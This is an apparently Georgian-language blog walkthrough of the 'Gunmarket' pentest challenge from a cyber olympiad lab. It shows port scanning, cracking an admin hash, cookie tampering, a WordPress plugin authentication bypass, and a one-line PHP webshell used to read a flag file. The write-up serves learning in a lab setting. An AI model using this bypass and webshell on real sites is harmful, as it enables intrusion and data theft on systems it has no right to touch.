# Pentest: Gunmarket

გამარჯობა, დღეს განვიხილავ კიბერ ოლიმპიადის მორიგი კატეგორიის Pentest-ის ერთ-ერთ სავარჯიშოს, Gunmarket-ს და ვეცდები, თითოეული ნაბიჯი…

გამარჯობა, დღეს განვიხილავ კიბერ ოლიმპიადის მორიგი კატეგორიის **Pentest**\-ის ერთ-ერთ სავარჯიშოს, **Gunmarket**\-ს და ვეცდები, თითოეული ნაბიჯი დეტალურად ავხსნა.

უკვე განხილული კატეგორიები თუ გაინტერესებს, შეგიძლია გაეცნოთ:

> **_Pcap Analysis_**_ — _[_https://bit.ly/2M9L7f0_](https://bit.ly/2M9L7f0)

> **_რა არის Buffer Overflow ?_**_\-_ [_https://bit.ly/2GZbNLr_](https://bit.ly/2GZbNLr)

> **Log analysis **— [https://bit.ly/2HntEMc](https://bit.ly/2HntEMc)

აღნიშნულ დავალებაში განვიხილავთ ისეთ თემებს, როგორებიცაა:

*   პორტების სკანირება
*   **Salted** პაროლების გატეხვა **JohnTheRipper** ის საშუალებით.
*   ცუდი [**cookie based authentication**](https://stackoverflow.com/questions/17769011/how-does-cookie-based-authentication-work)\- ის მაგალითს
*   დირექტორიების ენუმერაციას
*   **WPScan** ის გამოყენება და მისი დახმარებით ავტორიზაციაზე გვერდის ავლა.
*   **Webshell**

კიბერ ოლიმპიადაზე გამოყენებული სავარჯიშოები შეგიძლიათ [**cyber-lab**](https://cyber-lab.tech/geo/challenges) — ზე იხილოთ.

მაშ ასე, ამოცანის პირობა შემდეგია:

![](img/1__98M9EnXdlkwxUwRSLLgKKw.png)

მოცემული გვაქვს ორი კითხვა, რომლებიც 2 გასაღების პოვნას გვავალებს.

მოდი დავიწყოთ პირველი გასაღების ძებნა.

> **nmap -sC -sV -oA nmap/gunmarket 185.212.254.63**

*   \-**sC —** დეფაულტ სკრიპტებისთვის.
*   **\-sV —** ვერსიების ენუმერაციისთვის.
*   **\-oA nmap/gunmarket —** აუთფუთის ფაილში ჩასაწერად.

![](img/1__D8XEEFXm7GPsk5nGIRN9HQ.png)

გავიგეთ რომ საიტზე ღიაა პორტი **80**, მოდი გავხსნათ ის ვნახოთ რა გვაქვს მოცემული:

![](img/1__cFO__kHnbs4B5LHQ0HOpFxA.png)

მოცემულია მხოლოდ მარკეტის სურათი, სორსშიც საინტერესო არაფერია:

![](img/1____WoLo8SKda6rP1cWOu6uGg.png)

### გადავიდეთ დირექტორიების ენუმირაციაზე

ენუმირაციისთვის გამოვიყენოთ dirb-ი

> **dirb** [http://185.212.254.63](http://185.212.254.63)

> **P.S.** Ip თქვენ შემთხვევაში სავარაუდოთ სხვა იქნება.

**dirb**\-მა რამდენიმე საინტერესო რამ იპოვა, პირველი — ეს არის ფოლდერი **/wp**, ხოლო მეორე **/.bash\_history** ფაილი, რომელმაც სავარაუდოთ საინტერესო ინფორმაცია უნდა მოგვცემს.

![](img/1__keU__QrpsgywBP3cAsHGzVQ.png)

/**wp** დირქტორიაზე წვდომა არ გვაქვს:

![](img/1__exsoqwaUciNUT5__Z53Itjw.png)

ხოლო **/.bash\_history** — ის ნახვა თავისუფლად შეგვიძლია.

![](img/1__Q__fQ__CG8LjgKDjtkTggqHw.png)

მასში ჩახედვისას საინტერესო ინფორმაციას ვგებულობთ:

*   დირექტორია **/ctf/admin**
*   ადმინის იუზერნეიმი და პაროლი(ჰეშირებული).

![](img/1__ev366r__IXUb1nz5McPGsQQ.png)

**/ctf/admin** დირექტორიაზე გადასვლისას გვთხოვს იუზერნეიმსა და პაროლს.

![](img/1__GDZsO__z9VWARVAzNT2roRA.png)

იუზერნეიმი უკვე ვიცით, რომ **admin**\-ია, პაროლის გასაგებად კი **JohnTheRipper**\-ი გამოვიყენოთ.

პაროლის გასატეხად **john**\-თან ერთად დაგვჭირდება ვორდლისტი, ამ შემთხვევაში გამოვიყენებ **rockyou**\-ის, რომლის ჩაწერაც აღნიშნული ლინკიდან შეგიძლიათ — [**rockyou**](https://github.com/brannondorsey/naive-hashcat/releases/tag/data)**.**

### გავტეხოთ პაროლი

> რაიმე ფაილში ჩაწერეთ პაროლის ჰეში, ჩემ შემთხვევაში **gunmarket\_pass** — ში მოვათავსე ის.

![**echo ‘admin:$apr1$T9QLutEh$9Y192r5I3TI52/bsdksIy.’ > gunmarket\_pass**](img/1__gP__YxbiWgF0bddVyFIHRmw.png)
**echo ‘admin:$apr1$T9QLutEh$9Y192r5I3TI52/bsdksIy.’ > gunmarket\_pass**

> **john — wordlist=rockyou.txt gunmarket\_pass**

> სადაც **rockyou.txt** თქვენი პაროლების სიის მისამართია, ხოლო **gunmarket\_pass**\- იმ ფაილის მისამართი სადაც პაროლის ჰეშია მოთავსებული.

![](img/1__mX9qct54dYqsjj7T50JYvQ.png)

გავიგეთ ადმინის პაროლიც — **admin123.**

შეგვიძლია დავუბრუნდეთ **/ctf/admin/** დირექტორიას, სადაც **Cookie Monster**\-ის ფოტო გვხდება.

![](img/1__xtZO4G5iYEfJnLWd8z__MMw.png)

ჰინთი უკვე გასაგებია, დროა ქუქებს ჩავხედოთ:

ქუქებში ერთი ველი გვაქვს მოცემული, სახელად **username** ხოლო მისი მნიშვნელობა, ჩვენ შემთხვევაში **guest\_user**\-ია.

![](img/1__MMB37uiQ9BzamhHU8janqA.png)

მოდი შევცვალოთ **guest\_user** — **admin**\-ით და ვნახოთ რამოხდება:

![](img/1__UkHCi9dhA8kIELDjGjQtUw.png)

მივიღეთ პირველი გასაღები და ჰინთი მეორე გასაღების საძიებლად.

**/wp/wordpress**\-ზე გვხდება ვორდპრესის საიტი, რომელზეც არაფერი არ არის განთავსებული, არ გვაძლევს არანაირ მინიშნებას.

![](img/1____n1Zj1UarphnN6Mtkx9rwA.png)

მოდი ვცადოთ **WPScan** და ვნახოთ მოგვცემს თუ არა რაიმე შედეგს.

> **WPScan** არის ხელსაწყო **Wordpress** ის საიტების მოწყვლადობების საძიებლად.

**WPScan**\-მა ოთხი საინტერესო მოწყვლადობა იპოვა, პირველის საშუალებით, როგორც ის გვეუბნება შეგვიძლია ავტორიზაციაზე გვერდის ავლა.

მოდი ვცადოთ მისი გამოყენება.

![](img/1__safXuxmrNmqE5iw6boqwbA.png)

როგორც [**exploit-db**](https://www.exploit-db.com/exploits/43117) დან ვგებულობთ, თუ საიტზე დეფაულტ იუზერი **admin**\-ი გვყავს, შეგვიძლია მისი ანგარიშის გამოყენება, და საიტზე ავტორიზაციის გარეშე შესვლა ლინკში — `**?up_auto_log=true**` — ის მიმატებით.

![](img/1__OdGW0UoBe3h0VlCDW46vig.png)

გადავიდეთ ლინკზე —[**http://185.212.254.63/wp/wordpress/?up\_auto\_log=true**](http://185.212.254.63/wp/wordpress/?up_auto_log=true)

იმუშავა აღნიშნულმა ექსპლოიტმა, საიტის სამართავ პანელზე წვდომა მოვიპოვეთ.

![](img/1__Ng9Ry__Mo8CIYlfr43erpRg.png)

საიტზე წვდომა გვაქვს, შემდეგი ნაბიჯია სისტემაზე წვდომის მოპოვება.

ამისთვის გამოვიყენებ **webshell**\-ს.

უამრავ ადგილას შეგვიძლია შელის განთავსება, მე აქტიური თემის **404.php** ავირჩიე.

რომლის ნახვისთვისაც უნდა შეხვიდეთ **Appearance** შემდეგ კი **editor-**ში.

საქმე კიდევ უფრო გამარტივებული დაგხვდა, **webshell** კოდი უკვე განთავსებულაი **404.php** ში.

რომლის არ არსებობის შემთხვევაშიც, უბრალოდ დავამატებდით **webshell** კოდს და შევინახავდით ფაილს.

> echo passthru($\_GET\[‘cmd’\]);

![](img/1__1eVTnG__PJvQloVAh__e7ebQ.png)

**webshell** იც გვაქვს, მის გამოსაყენებლად საკმარისია გადავიდეთ იმ მისამართზე, სადაც ისაა განთავსებული და არგუმენტად გადავცეთ **cmd=** და შემდეგ ის ბრძანება, რისი გაშვებაც გვინდა.

საცდელად გავუშვათ **cmd=ls**

![](img/1__4Ll2U1SDlBNNwsjTCocGeg.png)

ჩვენი შელი მუშაობს, ისღა დაგვრჩენია მეორე გასაღები ვიპოვოთ.

რამდენიმე დირექტორიით უკან გასვლის შემდეგ, გვხდება ფაილი, რომელიც სავარაუდოთ ჩვენი მეორე გასაღებია.

![](img/1__ky0__7QGX2woIqhAUGkZeow.png)

მის სანახავად საკმარისია **ls** შევცვალოთ **cat** ით და მისამართში დავამატოთ ჩვენი ფაილის სახელი:

![[**http://185.212.254.50/wp/wordpress/wp-content/themes/twentyseventeen/404.php?cmd=cat%20../../../../../s3cr3t\_fil3\_for\_transactions**](http://185.212.254.50/wp/wordpress/wp-content/themes/twentyseventeen/404.php?cmd=cat%20../../../../../s3cr3t_fil3_for_transactions)](img/1__UzNPGb8BNWFOYU0qcLjHpg.png)
[**http://185.212.254.50/wp/wordpress/wp-content/themes/twentyseventeen/404.php?cmd=cat%20../../../../../s3cr3t\_fil3\_for\_transactions**](http://185.212.254.50/wp/wordpress/wp-content/themes/twentyseventeen/404.php?cmd=cat%20../../../../../s3cr3t_fil3_for_transactions)

მეორე გასაღებიც ვიპოვეთ.

კიბერ ოლიმპიადა ძალიან კარგი საშუალებაა ახალი ინფორმაციის შესასწავლად, [**cyber-lab**](https://cyber-lab.tech/) ზე შეგიძლიათ აკეთოთ სავარჯიშოები, რომლებიც გაგაცნობენ რეალურ ინციდენტებს, უამრავი ვორდპრესის **“**დეველოპერი**”** უშვებს მსგავს შეცდომას, არ ანახლებენ დროულად პლაგინებს, აყენებენ გატეხილებს (რომლებშიც გარანტირებულია მსგავში შელ კოდები).

**Feedback is welcome ;)**

By [Aleksi Kistauri](https://medium.com/@aleksikistauri) on [August 24, 2019](https://medium.com/p/16ab7a934d4e).

[Canonical link](https://medium.com/@aleksikistauri/pentest-gunmarket-16ab7a934d4e)

Exported from [Medium](https://medium.com) on January 6, 2020.